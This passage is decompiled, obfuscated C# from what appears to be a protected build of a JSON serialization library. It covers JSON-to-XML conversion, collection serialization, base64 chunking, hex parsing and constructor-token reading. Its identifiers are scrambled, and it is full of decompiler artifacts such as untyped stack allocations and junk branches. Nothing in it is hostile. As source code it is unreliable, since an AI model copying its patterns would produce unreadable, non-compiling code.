      if (\u0007\u0002.\u008C\u0004(obj3, \u0014.\u0006.\u0082(11880)))
      {
        string str1 = (string) null;
        string str2;
        string str3;
        if (true)
        {
          str2 = (string) null;
          str3 = (string) null;
        }
        while (obj0.\u0001() && obj0.\u0001() != JsonToken.EndObject)
        {
          string str4 = global::\u0001.\u007E\u0001(obj0.\u0001());
          if (!\u0007\u0002.\u008C\u0004(str4, \u0014.\u0006.\u0082(10001)))
          {
            if (true)
            {
              if (!\u0007\u0002.\u008C\u0004(str4, \u0014.\u0006.\u0082(10014)))
              {
                if (\u0007\u0002.\u008C\u0004(str4, \u0014.\u0006.\u0082(10027)))
                {
                  obj0.\u0001();
                  str3 = global::\u0001.\u007E\u0001(obj0.\u0001());
                  continue;
                }
              }
              else
              {
                obj0.\u0001();
                str2 = global::\u0001.\u007E\u0001(obj0.\u0001());
                continue;
              }
            }
            throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(11889), obj0.\u0001()));
          }
          obj0.\u0001();
          str1 = global::\u0001.\u007E\u0001(obj0.\u0001());
        }
        IXmlNode xmlNode = obj4.\u0001(str1, str2, str3);
        obj1.\u0001(xmlNode);
      }
      else
      {
        IXmlNode xmlNode = obj4.\u0001(\u0097\u0002.\u007E\u001C\u0006((object) obj3, 1), global::\u0001.\u007E\u0001(obj0.\u0001()));
        obj1.\u0001(xmlNode);
      }
    }

    static void \u0001([In] JsonWriter obj0, [In] \u0010.\u0006 obj1, [In] object obj2, [In] \u0016.\u0007 obj3)
    {
      if (((\u0016.\u0008) obj1).\u0001 != null && ((\u0016.\u0008) obj1).\u0001.\u0001() >= TraceLevel.Info)
        goto label_2;
label_1:
      \u0014.\u0006.\u0001(obj3, obj2, ((\u0016.\u0008) obj1).\u0001.\u0001);
      return;
label_2:
      ((\u0016.\u0008) obj1).\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj0), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11990), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002())), (Exception) null);
      goto label_1;
    }

    static unsafe void \u0001(
      [In] \u0001.\u0007 obj0,
      [In] IEnumerable obj1,
      [In] JsonWriter obj2,
      [In] \u0010.\u0006 obj3,
      [In] \u0006.\u0002 obj4,
      [In] JsonProperty obj5,
      [In] JsonProperty obj6)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      object obj7 = obj1 is \u000E.\u0006 obj8 ? obj8.\u0001() : (object) obj1;
      \u0014.\u0006.\u0001(obj3, obj2, (\u0016.\u0007) obj0, obj7);
      obj3.\u0001.Add(obj7);
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0014.\u0006.\u0001(obj6, obj7, obj0, obj5, obj2, obj4, obj3);
      obj2.\u0003();
      *(int*) voidPtr = \u0014.\u0006.\u0001(obj2);
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      IEnumerator enumerator = \u001D\u0002.\u007E\u008A\u0005((object) obj1);
      try
      {
        while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
        {
          object obj9 = \u0084\u0002.\u007E\u0095\u0005((object) enumerator);
          try
          {
            \u0016.\u0007 obj10 = ((\u0006.\u0002) obj0).\u0002 ?? \u0014.\u0006.\u0001(obj9, obj3);
            if (\u0014.\u0006.\u0001(obj9, obj10, (JsonProperty) null, obj5, (\u0006.\u0002) obj0, obj3))
              \u0014.\u0006.\u0001(obj9, obj2, obj3);
            else if (\u0014.\u0006.\u0001(obj3, obj2, obj9, (JsonProperty) null, obj10, (\u0006.\u0002) obj0, obj5))
              \u0014.\u0006.\u0001(obj3, obj2, obj9, obj10, (JsonProperty) null, (\u0006.\u0002) obj0, obj5);
          }
          catch (Exception ex)
          {
            if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj2), obj7, (object) *(int*) ((IntPtr) voidPtr + 4), ex, (\u000F.\u0001) null, (\u0016.\u0007) obj0, (\u0016.\u0008) obj3))
              \u0014.\u0006.\u0001(obj2, obj3, *(int*) voidPtr);
            else
              throw;
          }
          finally
          {
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          global::\u0011.\u007E\u0007\u0002((object) disposable);
      }
      obj2.\u000F();
      if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
        obj2.\u0011();
      obj3.\u0001.RemoveAt(obj3.\u0001.Count - 1);
      \u0014.\u0006.\u0001(obj2, obj3, obj7, (\u0016.\u0007) obj0);
    }

    static \u0004.\u0001 \u0001([In] JsonWriter obj0) => obj0.\u0001;

    static List<MemberInfo> \u0001([In] System.Type obj0_1, [In] BindingFlags obj1)
    {
      List<MemberInfo> memberInfoList;
      do
      {
        List<MemberInfo> source1 = new List<MemberInfo>();
        \u000E.\u0008.\u0001<MemberInfo>((IList<MemberInfo>) source1, (IEnumerable) \u0014.\u0006.\u0001(obj1, obj0_1));
        \u000E.\u0008.\u0001<MemberInfo>((IList<MemberInfo>) source1, (IEnumerable) \u0014.\u0006.\u0001(obj1, obj0_1));
        memberInfoList = new List<MemberInfo>(source1.Count);
        foreach (IGrouping<string, MemberInfo> source2 in source1.GroupBy<MemberInfo, string>((Func<MemberInfo, string>) (obj0_2 => global::\u0001.\u007E\u000E((object) obj0_2))))
        {
          int num = source2.Count<MemberInfo>();
          IList<MemberInfo> list = (IList<MemberInfo>) source2.ToList<MemberInfo>();
          if (num == 1)
            memberInfoList.Add(list.First<MemberInfo>());
          else if (true)
          {
            IList<MemberInfo> collection = (IList<MemberInfo>) new List<MemberInfo>();
            foreach (MemberInfo memberInfo in (IEnumerable<MemberInfo>) list)
            {
              if (collection.Count == 0)
                collection.Add(memberInfo);
              else if (!\u0014.\u0006.\u0001(memberInfo, obj1) || memberInfo.Name == \u0014.\u0006.\u0082(12023))
                collection.Add(memberInfo);
            }
            memberInfoList.AddRange((IEnumerable<MemberInfo>) collection);
          }
          else
            break;
        }
      }
      while (false);
      return memberInfoList;
    }

    static bool \u0001([In] JsonToken obj0)
    {
      switch (obj0)
      {
        case JsonToken.EndObject:
        case JsonToken.EndArray:
        case JsonToken.EndConstructor:
          return true;
        default:
          return false;
      }
    }

    static unsafe void \u0001([In] byte[] obj0, [In] int obj1, [In] \u0004.\u0005 obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(20);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      if (obj0 != null)
        goto label_31;
label_1:
      throw new ArgumentNullException(\u0014.\u0006.\u0082(12032));
label_31:
      if (obj3 < 0)
        throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(12041));
      int num2 = obj1 >= 0 ? obj1 : throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(12050));
      int num3 = obj0.Length;
      int num4;
      while (true)
      {
        int num5 = num3 - obj3;
        if (num2 <= num5)
        {
          if (obj2.\u0001 > 0)
          {
            for (num4 = obj2.\u0001; num4 < 3 && obj1 > 0; --obj1)
              obj2.\u0001[num4++] = obj0[obj3++];
            if (obj1 != 0 || num4 >= 3)
            {
              *(int*) ((IntPtr) voidPtr + 8) = \u0088\u0003.\u0019\u0007(obj2.\u0001, 0, 3, obj2.\u0001, 0);
              \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 8), obj2, 0, obj2.\u0001);
            }
            else
              goto label_14;
          }
          obj2.\u0001 = obj1 % 3;
          if (obj2.\u0001 > 0)
          {
            obj1 -= obj2.\u0001;
            if (obj2.\u0001 == null)
              obj2.\u0001 = new byte[3];
            *(int*) ((IntPtr) voidPtr + 12) = 0;
            int num6;
            int num7;
            while (true)
            {
              num6 = *(int*) ((IntPtr) voidPtr + 12);
              num7 = obj2.\u0001;
              if (true)
              {
                if (num6 < num7)
                {
                  obj2.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = obj0[obj3 + obj1 + *(int*) ((IntPtr) voidPtr + 12)];
                  *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
                }
                else
                  goto label_23;
              }
              else
                break;
            }
            num3 = num7;
            num2 = num6;
          }
          else
            goto label_23;
        }
        else
          break;
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(12050));
label_14:
      obj2.\u0001 = num4;
      return;
label_23:
      *(int*) voidPtr = obj3 + obj1;
      *(int*) ((IntPtr) voidPtr + 4) = 57;
      for (; obj3 < *(int*) voidPtr; obj3 += *(int*) ((IntPtr) voidPtr + 4))
      {
        if (obj3 + *(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
        {
          if (true)
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr - obj3;
          else
            goto label_1;
        }
        *(int*) ((IntPtr) voidPtr + 16) = \u0088\u0003.\u0019\u0007(obj0, obj3, *(int*) ((IntPtr) voidPtr + 4), obj2.\u0001, 0);
        \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 16), obj2, 0, obj2.\u0001);
      }
    }

    static int \u0001([In] bool obj0, [In] int obj1, [In] \u0016.\u0011 obj2) => (obj0 ? 5 : 1) + obj1;

    static int \u0001([In] char obj0)
    {
      if (false)
        goto label_13;
      else
        goto label_8;
label_3:
      int num1;
      return num1 - 55;
label_6:
      if (true)
        throw new FormatException(global::\u0006.\u009B(\u0014.\u0006.\u0082(12059), obj0.ToString()));
      goto label_13;
label_8:
      if (obj0 <= '9' && obj0 >= '0')
        return (int) obj0 - 48;
      if (true)
      {
        int num2 = (int) obj0;
        if (false)
          return num2;
        if (num2 > 70 || obj0 < 'A')
        {
          if (obj0 > 'f')
            goto label_6;
          else
            goto label_13;
        }
      }
      num1 = (int) obj0;
      goto label_3;
label_13:
      num1 = (int) obj0;
      if (true)
      {
        if (num1 >= 97)
          return (int) obj0 - 87;
        goto label_6;
      }
      else
        goto label_3;
    }

    static \u0016.\u0003 \u0001() => new \u0016.\u0003();

    static MemberInfo \u0001([In] DefaultContractResolver obj0_1, [In] System.Type obj1) => \u0014.\u0006.\u0001(obj1, obj0_1).SelectMany<System.Type, MemberInfo>((Func<System.Type, IEnumerable<MemberInfo>>) (obj0_2 =>
    {
      List<MemberInfo> memberInfoList = new List<MemberInfo>();
      \u000E.\u0008.\u0001<MemberInfo>((IList<MemberInfo>) memberInfoList, (IEnumerable<MemberInfo>) obj0_2.GetProperties(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic));
      \u000E.\u0008.\u0001<MemberInfo>((IList<MemberInfo>) memberInfoList, (IEnumerable<MemberInfo>) obj0_2.GetFields(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic));
      return (IEnumerable<MemberInfo>) memberInfoList;
    })).LastOrDefault<MemberInfo>((Func<MemberInfo, bool>) (obj0_3 =>
    {
      switch (\u0015.\u000E.\u0001(obj0_3))
      {
        case MemberTypes.Field:
        case MemberTypes.Property:
          // ISSUE: type reference
          if (!\u0096\u0004.\u007E\u008F\u0008((object) obj0_3, \u0004\u0002.\u0084\u0004(__typeref (\u0012.\u0002)), false))
          {
            if (true)
              return false;
          }
          else
            goto label_10;
label_9:
          // ISSUE: reference to a compiler-generated field
          throw new JsonException(\u0002.\u0002.\u0001(DefaultContractResolver.\u003C\u003Ec.\u008D(28726), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0_3)), (object) global::\u0001.\u007E\u000E((object) obj0_3)));
label_10:
          if (!\u0014.\u0006.\u0001(obj0_3, true))
          {
            // ISSUE: reference to a compiler-generated field
            throw new JsonException(\u0002.\u0002.\u0001(DefaultContractResolver.\u003C\u003Ec.\u008D(28625), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0018\u0004((object) obj0_3)), (object) global::\u0001.\u007E\u000E((object) obj0_3)));
          }
          System.Type type1;
          // ISSUE: type reference
          if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj0_3), \u0004\u0002.\u0084\u0004(__typeref (IDictionary<,>)), out type1))
          {
            \u0093\u0002 obj = \u0093\u0002.\u007E\u0012\u0006;
            System.Type type2 = \u008F\u0002.\u007E\u000E\u0006((object) type1)[0];
            System.Type type3 = \u008F\u0002.\u007E\u000E\u0006((object) type1)[1];
            // ISSUE: type reference
            System.Type type4 = \u0004\u0002.\u0084\u0004(__typeref (string));
            // ISSUE: type reference
            if (obj((object) type2, type4) && \u0093\u0002.\u007E\u0012\u0006((object) type3, \u0004\u0002.\u0084\u0004(__typeref (\u0015.\u0013))))
              return true;
            goto label_9;
          }
          else
            goto label_9;
        default:
          return false;
      }
    }));

    static bool \u0001([In] JsonWriter obj0, [In] JsonProperty obj1, [In] object obj2, [In] \u0010.\u0006 obj3)
    {
      if (obj1.\u0001() == null)
        return true;
      if (true)
        goto label_5;
label_4:
      bool flag;
      return flag;
label_5:
      flag = obj1.\u0001()(obj2);
      if (((\u0016.\u0008) obj3).\u0001 != null && ((\u0016.\u0008) obj3).\u0001.\u0001() >= TraceLevel.Verbose)
      {
        ((\u0016.\u0008) obj3).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj0), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(12092), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0001, (object) obj1.\u0001(), (object) flag)), (Exception) null);
        goto label_4;
      }
      else
        goto label_4;
    }

    static bool \u0001() => \u0005\u0003.\u008B\u0006(\u0089\u0003.\u001A\u0007(), \u0014.\u0001.\u0001);

    static bool \u0001(ref Version _param0, [Out] string _param1)
    {
      bool flag;
      try
      {
        _param0 = new Version(_param1);
        flag = true;
      }
      catch
      {
        if (true)
        {
          if (true)
            _param0 = (Version) null;
          flag = false;
        }
      }
      return flag;
    }

    static object \u0001([In] System.Type obj0)
    {
      if (!\u0015.\u000E.\u000E(obj0))
        return (object) null;
      double num1;
      switch (\u0014.\u0006.\u0001(obj0))
      {
        case \u000F.\u0003.\u0003:
        case \u000F.\u0003.\u0007:
        case \u000F.\u0003.\u000E:
        case \u000F.\u0003.\u0010:
        case \u000F.\u0003.\u0012:
        case \u000F.\u0003.\u0014:
        case \u000F.\u0003.\u0016:
          return (object) 0;
        case \u000F.\u0003.\u0005:
          if (true)
            return (object) false;
          goto label_15;
        case \u000F.\u0003.\u0018:
        case \u000F.\u0003.\u001A:
          return (object) 0L;
        case \u000F.\u0003.\u001C:
          num1 = 0.0;
          break;
        case \u000F.\u0003.\u001E:
          double num2 = 0.0;
          if (true)
            return (object) num2;
          num1 = num2;
          break;
        case \u000F.\u0003.\u007F:
          return (object) new DateTime();
        case \u000F.\u0003.\u0081:
          return (object) new DateTimeOffset();
        case \u000F.\u0003.\u0083:
          return (object) 0M;
        case \u000F.\u0003.\u0086:
          return (object) new Guid();
        default:
          if (!\u0014.\u0006.\u0001(obj0))
            return \u008A\u0003.\u001B\u0007(obj0);
          goto label_15;
      }
      return (object) (float) num1;
label_15:
      return (object) null;
    }

    static \u0010.\u0007 \u0001([In] JsonSerializerInternalReader obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = new \u0010.\u0007(obj0);
      return obj0.\u0001;
    }

    static \u0012.\u0003 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0012.\u0003? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0012.\u0003) num;
      return num == 0 ? \u0012.\u0003.\u0001 : nullable.GetValueOrDefault();
    }

    static void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] ISerializable obj2,
      [In] \u0005.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      if (!JsonTypeReflector.\u0002())
      {
        string str = \u0002.\u0002.\u0001(\u0008\u0003.\u008E\u0006(\u0014.\u0006.\u0082(12165), global::\u0004.\u0097(), \u0014.\u0006.\u0082(12419), global::\u0004.\u0097()), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004((object) obj2));
        throw \u0014.\u0006.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), str, (Exception) null);
      }
      \u0014.\u0006.\u0001(obj0, obj1, (\u0016.\u0007) obj3, (object) obj2);
      obj0.\u0001.Add((object) obj2);
      \u0014.\u0006.\u0001(obj4, obj0, (\u0016.\u0007) obj3, obj6, obj1, (object) obj2, obj5);
      SerializationInfo serializationInfo = new SerializationInfo(obj3.\u0002(), (IFormatterConverter) new FormatterConverter());
      \u008B\u0003.\u007E\u001D\u0007((object) obj2, serializationInfo, ((\u0016.\u0008) obj0).\u0001.\u0001);
      SerializationInfoEnumerator serializationInfoEnumerator = \u008C\u0003.\u007E\u001E\u0007((object) serializationInfo);
      while (\u0015\u0002.\u007E\u0017\u0005((object) serializationInfoEnumerator))
      {
        SerializationEntry serializationEntry = \u008D\u0003.\u007E\u001F\u0007((object) serializationInfoEnumerator);
        \u0016.\u0007 obj = \u0014.\u0006.\u0001(serializationEntry.Value, obj0);
        if (\u0014.\u0006.\u0001(serializationEntry.Value, obj, (JsonProperty) null, obj4, (\u0006.\u0002) obj3, obj0))
        {
          obj1.\u0002(serializationEntry.Name);
          \u0014.\u0006.\u0001(serializationEntry.Value, obj1, obj0);
        }
        else if (\u0014.\u0006.\u0001(obj0, obj1, serializationEntry.Value, (JsonProperty) null, obj, (\u0006.\u0002) obj3, obj4))
        {
          obj1.\u0002(serializationEntry.Name);
          \u0014.\u0006.\u0001(obj0, obj1, serializationEntry.Value, obj, (JsonProperty) null, (\u0006.\u0002) obj3, obj4);
        }
      }
      obj1.\u0011();
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      \u0014.\u0006.\u0001(obj1, obj0, (object) obj2, (\u0016.\u0007) obj3);
    }

    static bool \u0001(ref DateTimeOffset _param0, [Out] \u0015.\u0008 _param1)
    {
      int num1;
      do
      {
        TimeSpan offset;
        long num2;
        int num3 = \u0014.\u0006.\u0001(ref offset, _param1, out DateTimeKind _, out num2) ? 1 : 0;
        while (true)
        {
          if (num3 != 0)
          {
            if (true)
            {
              long num4 = num2;
              do
              {
                if (true)
                  num4 *= 10000L;
              }
              while (false);
              long num5 = \u0004.\u0007.\u0001;
              DateTime dateTime = new DateTime(num4 + num5, DateTimeKind.Utc);
              _param0 = new DateTimeOffset(dateTime.Add(offset).Ticks, offset);
              num1 = 1;
              if (num1 == 0)
                num3 = num1;
              else
                goto label_10;
            }
            else
              break;
          }
          else
            goto label_11;
        }
label_2:
        continue;
label_11:
        ref DateTimeOffset local = ref _param0;
        DateTime dateTime1 = new DateTime();
        DateTimeOffset dateTimeOffset = \u008E\u0003.\u007F\u0007(dateTime1);
        local = dateTimeOffset;
        goto label_2;
      }
      while (false);
      return false;
label_10:
      return num1 != 0;
    }

    static string \u0001([In] char obj0, [In] string obj1) => \u0014.\u0006.\u0001(obj0, \u0001.\u0003.\u0001, obj1);

    static object \u0001([In] \u0015.\u0013 obj0, [In] System.Type obj1)
    {
      if (\u0015.\u0006.\u0001() == null)
        goto label_52;
label_50:
      return \u0014.\u0006.\u0001(obj0, obj1, \u0014.\u0006.\u0001());
label_52:
      bool flag;
      \u000F.\u0003 obj = \u0014.\u0006.\u0001(obj1, out flag);
      if (!flag)
        goto label_5;
      else
        goto label_53;
label_3:
      if (obj0.\u0001() == JTokenType.Integer)
        return System.Enum.ToObject(\u0015.\u000E.\u0005(obj1) ? obj1 : \u0099\u0002.\u001F\u0006(obj1), ((\u0006.\u0005) obj0).\u0001);
label_5:
      int num1;
      switch (obj)
      {
        case \u000F.\u0003.\u0003:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u0004:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0005:
          num1 = \u0014.\u0006.\u0001(obj0) ? 1 : 0;
          break;
        case \u000F.\u0003.\u0006:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0007:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u0008:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u000E:
          int num2 = (int) \u0014.\u0006.\u0001(obj0);
          if (true)
            return (object) (short) num2;
          num1 = num2;
          break;
        case \u000F.\u0003.\u000F:
          if (true)
            return (object) \u0014.\u0006.\u0001(obj0);
          goto case \u000F.\u0003.\u0004;
        case \u000F.\u0003.\u0010:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u0011:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u0012:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0013:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0014:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0015:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0016:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u0017:
          if (true)
            return (object) \u0015.\u0013.\u0001(obj0);
          goto label_3;
        case \u000F.\u0003.\u0018:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0019:
          if (true)
            return (object) \u0014.\u0006.\u0001(obj0);
          goto case \u000F.\u0003.\u0008;
        case \u000F.\u0003.\u001A:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u001B:
          return (object) \u0015.\u0013.\u0001(obj0);
        case \u000F.\u0003.\u001C:
          if (true)
            return (object) \u0014.\u0006.\u0001(obj0);
          goto case \u000F.\u0003.\u0008;
        case \u000F.\u0003.\u001D:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u001E:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u001F:
          if (true)
            return (object) \u0014.\u0006.\u0001(obj0);
          goto label_53;
        case \u000F.\u0003.\u007F:
          if (true)
            return (object) \u0014.\u0006.\u0001(obj0);
          goto case \u000F.\u0003.\u0080;
        case \u000F.\u0003.\u0080:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0081:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0082:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0083:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0084:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0086:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0087:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0088:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u0089:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u008C:
          return (object) \u0014.\u0006.\u0001(obj0);
        case \u000F.\u0003.\u008D:
          return (object) \u0014.\u0006.\u0001(obj0);
        default:
          goto label_50;
      }
      return (object) (bool) num1;
label_53:
      if (obj0.\u0001() == JTokenType.String)
      {
        try
        {
          return \u0014.\u0006.\u0001(obj0, obj1, \u0014.\u0006.\u0001());
        }
        catch (Exception ex)
        {
          System.Type type = \u0015.\u000E.\u0005(obj1) ? obj1 : \u0099\u0002.\u001F\u0006(obj1);
          throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(12813), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0), (object) global::\u0001.\u007E\u000E((object) type)), ex);
        }
      }
      else
        goto label_3;
    }

    static unsafe void \u0001([In] \u0011.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      if (!\u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(12858)))
        goto label_23;
      else
        goto label_25;
label_11:
      \u0014.\u0006.\u0001(obj0);
      goto label_18;
label_17:
      char ch;
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(12920), (IFormatProvider) \u0098.\u0002\u0004(), (object) ch));
label_18:
      obj0.\u0001 = new \u0015.\u0008(obj0.\u0001, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4) - *(int*) voidPtr);
      if (true)
      {
        string str = obj0.\u0001.ToString();
        \u0014.\u0006.\u0001(obj0, false);
        if (obj0.\u0001[obj0.\u0002] != '(')
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(12920), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001[obj0.\u0002]));
        ++obj0.\u0002;
        if (true)
        {
          \u0014.\u0006.\u0001(obj0);
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartConstructor, (object) str);
          return;
        }
        goto label_17;
      }
      else
        goto label_26;
label_23:
      if (true)
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(12993));
      goto label_11;
label_25:
      \u0014.\u0006.\u0001(obj0, false);
      *(int*) voidPtr = obj0.\u0002;
label_26:
      int num1;
      int num2;
      while (true)
      {
        do
        {
          ch = obj0.\u0001[obj0.\u0002];
          if (ch == char.MinValue)
          {
            int num3 = obj0.\u0001;
            num2 = obj0.\u0002;
            num1 = num3;
          }
          else
            goto label_6;
label_2:
          if (num1 == num2)
            continue;
          goto label_5;
label_6:
          if (!\u009A.\u0008\u0004(ch))
          {
            switch (ch)
            {
              case '\n':
                goto label_10;
              case '\r':
                goto label_9;
              default:
                if (!\u009A.\u0005\u0004(ch))
                {
                  num1 = (int) ch;
                  num2 = 40;
                  if (num2 == 0)
                    goto label_2;
                  else
                    goto label_15;
                }
                else
                  goto label_13;
            }
          }
          else
            goto label_7;
        }
        while (\u0014.\u0006.\u0001(true, obj0) != 0);
        break;
label_7:
        ++obj0.\u0002;
      }
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(12863));
label_5:
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
      ++obj0.\u0002;
      goto label_18;
label_9:
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
      \u0014.\u0006.\u0001(obj0, true);
      goto label_18;
label_10:
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
      goto label_11;
label_13:
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
      ++obj0.\u0002;
      goto label_18;
label_15:
      if (num1 == num2)
      {
        *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
        goto label_18;
      }
      else
        goto label_17;
    }

    static \u0016.\u0002 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0016.\u0002? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0016.\u0002) num;
      return num == 0 ? \u0016.\u0002.\u0001 : nullable.GetValueOrDefault();
    }

    static unsafe object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] System.Type obj2,
      [In] \u0016.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] object obj5,
      [In] string obj6)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      if (\u0014.\u0006.\u0001(obj0, obj3))
        return (object) \u0014.\u0006.\u0001(obj1, obj3, obj0);
      \u0001.\u0007 obj7 = \u0014.\u0006.\u0001(obj0, obj1, obj2, obj3);
      IList list;
      object obj8;
      if (true)
      {
        if (obj5 == null)
        {
          // ISSUE: cast to a reference type
          list = \u0014.\u0006.\u0001((bool&) ((IntPtr) voidPtr + 4), obj1, obj7, obj0);
          if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
          {
            if (obj6 != null)
              throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13046), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
            if (\u0014.\u0006.\u0001(obj3).Count > 0)
              throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13188), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
            if (\u0014.\u0006.\u0001(obj3).Count > 0)
              throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13334), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
            if (!\u0014.\u0006.\u0001(obj7) && !obj7.\u0002())
              throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13472), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0002()));
          }
          if (!obj7.\u0001())
            \u0014.\u0006.\u0001(obj0, list, obj1, obj7, obj4, obj6);
          else
            \u0014.\u0006.\u0001(obj0, list, obj1, obj7, obj4, obj6);
          if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
          {
            if (obj7.\u0001())
            {
              System.Type type = obj7.\u0001();
              *(int*) voidPtr = \u001F.\u007E\u0016\u0003((object) obj3.\u0002);
              list = (IList) \u0014.\u0006.\u0001(*(int*) voidPtr, list, type);
